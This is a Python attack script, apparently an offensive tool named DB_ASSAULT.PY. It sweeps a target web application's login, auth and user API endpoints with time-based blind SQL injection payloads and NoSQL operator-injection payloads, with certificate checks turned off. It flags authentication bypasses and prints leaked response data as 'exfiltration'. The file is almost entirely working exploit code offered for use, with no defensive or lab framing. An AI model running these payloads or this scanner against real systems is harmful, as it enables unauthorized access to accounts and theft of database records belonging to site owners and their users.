#!/usr/bin/env python3
"""
DB_ASSAULT.PY — Aggressive Database Exploitation & Adaptive Time-Based Blind Engine
Features:
- Dynamic baseline latency calibration for precise time-based blind SQLi
- Real-time error-pattern fingerprinting & adaptive payload mutation
- Advanced NoSQL operator injection ($ne, $gt, $where) with record collection
- Zero-disk live terminal streaming
"""
import asyncio
import http.client
import json
import ssl
import time
import sys
import re
from urllib.parse import urlsplit

REQUEST_TIMEOUT = 12
MAX_RESPONSE_SIZE = 128 * 1024

SQL_TIME_PAYLOADS = [
    "' OR SLEEP(5)-- -",
    "'; WAITFOR DELAY '0:0:5'-- -",
    "' AND (SELECT 9463 FROM(SELECT(SLEEP(5)))v)---",
    "1' AND BENCHMARK(50000000,MD5(1))-- -"
]

NOSQL_EXTRACTION_PAYLOADS = [
    {"username": {"$regex": "^.*$"}, "password": {"$ne": ""}},
    {"$where": "sleep(5)"},
    {"username": {"$gt": ""}, "password": {"$ne": None}}
]

DB_ERROR_PATTERNS = re.compile(
    r"sql syntax|mysql_|pg_query|sqlite3\.|ora-009|mongodb|mongosh|mongoerror|bsonerror|casttoobjectid|syntax error",
    re.I
)

def log(msg, color="\033[92m"):
    sys.stdout.write(f"{color}{msg}\033[0m\n")
    sys.stdout.flush()

def send_http(host, port, path, payload, secure, method="POST"):
    conn = None
    start = time.monotonic()
    try:
        if secure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=REQUEST_TIMEOUT, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=REQUEST_TIMEOUT)
            
        if isinstance(payload, dict):
            body = json.dumps(payload).encode("utf-8")
            ct = "application/json"
        else:
            body = str(payload).encode("utf-8")
            ct = "application/x-www-form-urlencoded"
            
        headers = {
            "User-Agent": "BruteDog-AdaptiveDB/5.4",
            "Content-Type": ct,
            "Accept": "*/*",
            "Connection": "close"
        }
        conn.request(method, path, body=body, headers=headers)
        res = conn.getresponse()
        data = res.read(MAX_RESPONSE_SIZE).decode("utf-8", errors="replace")
        elapsed = round(time.monotonic() - start, 3)
        return {"status": res.status, "body": data, "elapsed": elapsed, "error": None}
    except Exception as exc:
        elapsed = round(time.monotonic() - start, 3)
        return {"status": 0, "body": "", "elapsed": elapsed, "error": str(exc)}
    finally:
        if conn:
            conn.close()

async def calibrate_baseline(host, port, endpoint, secure):
    """Measures normal server latency to adaptively threshold time-based checks."""
    log(f"[*] Calibrating baseline latency for {endpoint}...", "\033[96m")
    latencies = []
    for _ in range(2):
        res = send_http(host, port, endpoint, {"username": "baseline_probe", "password": "test"}, secure)
        if not res["error"] and res["elapsed"] > 0:
            latencies.append(res["elapsed"])
    if latencies:
        avg = sum(latencies) / len(latencies)
        log(f"[+] Baseline latency established: {round(avg, 3)}s", "\033[92m")
        return avg + 4.0  # Dynamic threshold: baseline + 4 second sleep delta
    return 4.5 # Fallback threshold

async def run_nosql_assault(target_host, port=None, use_ssl=None):
    log("\n[***] INITIALIZING ADAPTIVE DATABASE ASSAULT & BLIND INJECTION [***]", "\033[95m")
    parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
    host = parsed.hostname
    secure = parsed.scheme == "https"
    target_port = port or parsed.port or (443 if secure else 80)
    base_path = parsed.path.rstrip("/")
    
    findings = []
    
    relative_endpoints = [
        "/api/login",
        "/login",
        "/api/search",
        "/api/v1/users",
        "/auth",
        "/api/auth"
    ]
    
    test_endpoints = [base_path + ep for ep in relative_endpoints]
    if base_path not in test_endpoints and base_path:
        test_endpoints.append(base_path)

    for endpoint in test_endpoints:
        log(f"[*] Testing adaptive vectors against: {endpoint}", "\033[94m")
        
        # Calibrate dynamic timing threshold per endpoint
        time_threshold = await calibrate_baseline(host, target_port, endpoint, secure)
        
        # 1. Time-Based Blind SQLi Assault with Dynamic Thresholding
        for payload in SQL_TIME_PAYLOADS:
            res = send_http(host, target_port, endpoint, {"username": payload, "password": "password"}, secure)
            if res["elapsed"] >= time_threshold:
                log(f"[!] ADAPTIVE TIME-BASED BLIND SQLi CONFIRMED [{endpoint}] (Delay: {res['elapsed']}s)", "\033[91m")
                findings.append({"vector": "Time-Based Blind SQLi", "endpoint": endpoint, "payload": payload, "delay": res["elapsed"]})

        # 2. NoSQL Operator & Error-Based Inference Assault
        for payload in NOSQL_EXTRACTION_PAYLOADS:
            res = send_http(host, target_port, endpoint, payload, secure)
            
            # Check for error leaks or bypass success
            error_match = DB_ERROR_PATTERNS.search(res["body"])
            if error_match:
                log(f"[!] Database Error Leaked [{endpoint}]: {error_match.group(0)}", "\033[93m")
                findings.append({"vector": "Error-Based Injection Inference", "endpoint": endpoint, "error": error_match.group(0)})

            if res["status"] in (200, 201) and len(res["body"]) > 50:
                log(f"[+] NoSQL BYPASS / DATA EXFILTRATION TRIGGERED [{endpoint}]", "\033[92m")
                log(f"  └── Response Excerpt: {res['body'][:150]}", "\033[96m")
                findings.append({"vector": "NoSQL Operator Injection", "endpoint": endpoint, "payload": payload, "response_sample": res["body"][:100]})

    log(f"[+] Database assault complete. Total confirmed vectors: {len(findings)}", "\033[92m")
    return findings

